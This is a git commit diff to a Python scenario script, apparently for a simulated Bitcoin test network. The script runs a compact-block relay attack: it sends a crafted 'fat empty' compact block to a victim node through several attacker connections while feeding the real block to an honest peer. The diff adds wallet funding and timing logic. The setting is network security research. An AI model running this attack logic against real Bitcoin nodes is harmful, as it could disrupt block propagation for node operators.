fdafec45ccb75895b6538e9e4f60bc6a3a0bd9cb
David Gumberg <davidzgumberg@gmail.com>
2025-10-27 12:42:43 -0400

    latest

--- scenarios/cmpctatk.py
+++ scenarios/cmpctatk.py
@@ -13,10 +13,14 @@ from datetime import (
 
 from commander import Commander
 
+from test_framework.test_framework import BitcoinTestFramework
 from test_framework.blocktools import (
     create_block,
+    create_coinbase,
     NORMAL_GBT_REQUEST_PARAMS
 )
+
+from test_framework.wallet import MiniWallet
 
 # The entire Bitcoin Core test_framework directory is available as a library
 from test_framework.messages import (
@@ -66,7 +70,14 @@ class CmpctAtk(Commander):
         return conn
 
     def build_block_on_tip(self, node):
-        block = create_block(tmpl=node.getblocktemplate(NORMAL_GBT_REQUEST_PARAMS))
+        if self.wallet.get_balance() == 0:
+            print("Generating 101 blocks to the miner address for funding.")
+            self.generatetoaddress(node, 101, self.wallet.get_address(), sync_fun=self.no_op)
+            assert (self.wallet.get_balance() > 0)
+
+        txlist = [self.wallet.create_self_transfer()['tx']]
+
+        block = create_block(tmpl=self.nodes[0].getblocktemplate(NORMAL_GBT_REQUEST_PARAMS), txlist=txlist)
         block.solve()
         return block
 
@@ -90,8 +101,18 @@ class CmpctAtk(Commander):
         return [x.hash for x in last_data.inv] == hash_list
 
     def run_test(self):
+        attacker = self.tanks['miner']
         victim = "tank1"
         honest = "tank2"
+
+        # Set-up, to get some funds in the wallet.
+        honestpeer = self.connect_to_hostname(honest)
+
+        self.wallet = MiniWallet(attacker)
+        funding_block = self.build_block_on_tip(attacker)
+        honestpeer.send_and_ping(msg_headers([CBlockHeader(funding_block)]))
+        honestpeer.wait_for_getdata(funding_block.hash)
+        honestpeer.send_and_ping(msg_block(funding_block))
 
         # Now we will use a python-based Bitcoin p2p node to send very specific,
         # unusual or non-standard messages to a "victim" node.
@@ -100,32 +121,31 @@ class CmpctAtk(Commander):
         for i in range(3):
             attackers.append(self.connect_to_hostname(victim))
 
-        honestpeer = self.connect_to_hostname(honest)
-
-        real_block = self.build_block_on_tip(self.nodes[0])
-        attack_block = self.build_fat_empty_cmpct(real_block)
-        attack_block_msg = msg_cmpctblock(attack_block.to_p2p())
-        next_block_interrupt_time = datetime.now() + timedelta(seconds=20)
+        next_block_interrupt_time = None
         honestpeer_received = False
+        victim_received = False
         while True:
             now = datetime.now()
-            if honestpeer_received and now > next_block_interrupt_time:
+            if next_block_interrupt_time is None or (victim_received and honestpeer_received and now > next_block_interrupt_time):
                 print("Timeout reached, refreshing attack block.")
-                real_block = self.build_block_on_tip(self.nodes[0])
+                real_block = self.build_block_on_tip(attacker)
                 attack_block = self.build_fat_empty_cmpct(real_block)
                 attack_block_msg = msg_cmpctblock(attack_block.to_p2p())
                 next_block_interrupt_time = datetime.now() + timedelta(seconds=15)
                 honestpeer_received = False
+                victim_received = False
 
-            for victim_conn in attackers:
-                victim_conn.send_message(attack_block_msg)
+            if not victim_received:
+                for victim_conn in attackers:
+                    victim_conn.send_message(attack_block_msg)
+                victim_received = True
 
             honestpeer_getdata = honestpeer.last_message.get("getdata")
 
             # If the honest peer has not already received the block, and has
             # requested the block after receiving the header from us: send the block.
-            if next_block_interrupt_time - now > timedelta(seconds=10):
-                if not honestpeer_received and honestpeer_getdata is not None:
+            if not honestpeer_received and next_block_interrupt_time - now > timedelta(seconds=10):
+                if honestpeer_getdata is not None:
                     honestpeer.send_and_ping(msg_block(real_block))
                     honestpeer_received = True
                     print(f"Honest peer sent us a getdata for {real_block.hash} and we responded.")
